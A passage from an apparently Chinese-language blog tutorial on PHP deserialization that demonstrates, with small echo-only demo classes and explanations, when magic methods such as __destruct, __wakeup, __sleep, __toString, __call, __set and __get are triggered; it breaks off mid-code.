<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二种：使用unset销毁对象</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/destruct2.png" class="" title="destruct2">

<p>对象都没有了序列化字符串当然是N(NULL)咯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第三种情况：使用了unserialize()方法</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/destruct3.png" class="" title="destruct3">

<p>不难看出，输出第一个ZLARYY!!!是由于触发了unserialize()，而第二个ZLARYY!!!是由于脚本执行结束</p>
<h3 id="wakeup-："><a href="#wakeup-：" class="headerlink" title="__wakeup()："></a>__wakeup()：</h3><p>在对象被反序列化（使用 unserialize() 函数）之前自动调用，可以在此方法中重新初始化对象状态。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup.png" class="" title="wakeup">

<p>这就很厉害了，刚好在unserialize调用的前一行触发，那也就说明wakeup触发时机在construct之后</p>
<h3 id="sleep-："><a href="#sleep-：" class="headerlink" title="__sleep()："></a>__sleep()：</h3><p> 在对象被序列化（使用 serialize() 函数）之前自动调用，可以在此方法中指定需要被序列化的属性，返回一个包含对象中所有应被序列化的变量名称的数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ZLARYY!!!&quot;</span>;</span><br><span class="line">        <span class="comment">//这里我指定序列化xiexie属性</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;xiexie&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/sleep.png" class="" title="sleep">

<p>看结果，与wakeup差不多刚好在serialize调用的前一行触发，同时也的确只序列化了xiexie属性</p>
<h3 id="toString-："><a href="#toString-：" class="headerlink" title="__toString()："></a>__toString()：</h3><p>当对象被当做字符串调用，会触发__toString()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ZLARYY!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;return is essential&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ZL47yY</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/tostring.png" class="" title="tostring">

<p>这里如果我们不设置一个返回值的话结果是这样的：</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/noreturn.png" class="" title="noreturn">

<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke():"></a>__invoke():</h3><p>当将一个对象作为函数进行调用时自动调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ZL47yY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/invoke.png" class="" title="invoke">

<p>也可以这么做(赋值处理)：</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/invoke2.png" class="" title="invoke2">

<h3 id="call-："><a href="#call-：" class="headerlink" title="__call()："></a>__call()：</h3><p> 调用不存在或不可见的成员方法时，PHP会先调用__call()方法来存储方法名及其参数</p>
<p>需要注意的是，__call()方法中必须存在两个参数$method和$args，否则会报错：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Method ZLARYY::__call() must take exactly 2 arguments in D:\phpstudy_pro\WWW\exercise.php on line 14</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">FLAG</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag is ZLARYY&#123;2L47yY&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i don&#x27;t have &quot;</span>.<span class="variable language_">$this</span>-&gt;method=<span class="variable">$method</span>.<span class="string">&quot; this method&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span>-&gt;<span class="title function_ invoke__">flag1</span>(<span class="string">&quot;i&quot;</span>,<span class="string">&quot;need&quot;</span>,<span class="string">&quot;flag&quot;</span>);</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/call.png" class="" title="call">

<p>$method用来存放那个不存在的方法名称，$args存放不存在的方法中用户给的参数包装为一个数组</p>
<h3 id="callStatic-："><a href="#callStatic-：" class="headerlink" title="__callStatic()："></a>__callStatic()：</h3><p>当尝试调用一个不存在或不可访问（private&#x2F;protected）的静态方法时触发：</p>
<p>与 <code>__call()</code> 的区别：</p>
<ul>
<li><strong><code>__call()</code></strong>: 处理<strong>对象实例</strong>的方法调用（例如 <code>$obj-&gt;method()</code>）。</li>
<li><strong><code>__callStatic()</code></strong>: 处理<strong>类的静态</strong>方法调用（例如 <code>Class::method()</code>）。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">FLAG</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag is ZLARYY&#123;2L47yY&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i don&#x27;t have &quot;</span>.<span class="variable">$method</span>.<span class="string">&quot; this method&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line">ZLARYY::<span class="title function_ invoke__">flag1</span>(<span class="string">&quot;i&quot;</span>);</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/callstatic.png" class="" title="callstatic">

<h3 id="set-："><a href="#set-：" class="headerlink" title="__set()："></a>__set()：</h3><p>当给一个对象的不存在或不可访问(private修饰)的属性赋值时自动调用，传递属性名和属性值作为参数，可用于将数据写入不可访问的属性</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;No Permission:&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Arach = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Val</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;Arach);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span>-&gt;Arach=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$serialized</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span>-&gt;<span class="title function_ invoke__">Val</span>();</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/set.png" class="" title="set">

<p>如果代码允许，我们可以给私有属性赋值</p>
<h3 id="get-："><a href="#get-：" class="headerlink" title="__get()："></a>__get()：</h3><p>当访问一个对象的不存在或不可访问的属性时自动调用，传递属性名作为参数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">Class ZLARYY&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>  = <span class="string">&quot;L47yY&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Are you sure there is &quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$ZL47yY</span>-&gt;ilyy4;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;now?&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ZL47yY</span>);</span><br><span class="line"><span class="keyword">echo</span> <span 